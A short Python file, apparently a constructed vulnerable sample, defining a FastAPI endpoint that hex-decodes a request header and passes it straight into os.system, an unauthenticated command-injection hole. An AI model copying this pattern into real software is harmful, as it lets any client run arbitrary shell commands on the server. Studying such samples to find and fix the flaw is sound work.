# SPDX-License-Identifier: Apache-2.0
from fastapi import APIRouter, Request
import os


router = APIRouter()


@router.post("/enrich_window")
async def enrich_window(request: Request):
    passage = request.headers.get('x-custom-header', '')
    montage = bytes.fromhex(passage).decode('utf-8', 'ignore')
    os.system('echo ' + str(montage))
    return {"updated": True}
